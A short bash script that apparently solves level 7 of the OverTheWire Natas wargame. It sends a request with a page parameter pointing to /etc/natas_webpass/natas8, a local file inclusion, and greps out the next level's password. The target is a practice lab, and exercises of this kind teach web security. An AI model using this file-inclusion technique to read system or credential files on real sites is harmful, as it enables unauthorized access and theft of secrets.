#!/bin/bash
if [ $# -eq 0 ]
  then echo "Please pass the password as argument"
  exit
fi
# Here, the grep is a little different. We are looking explicitly for 32 alphanumeric characters at the beginning of a line
tmp=`curl -s "http://natas7:$1@natas7.natas.labs.overthewire.org/?page=/etc/natas_webpass/natas8" | grep -E -o '^[[:alnum:]]{32}'`
echo The password for natas8 is $tmp
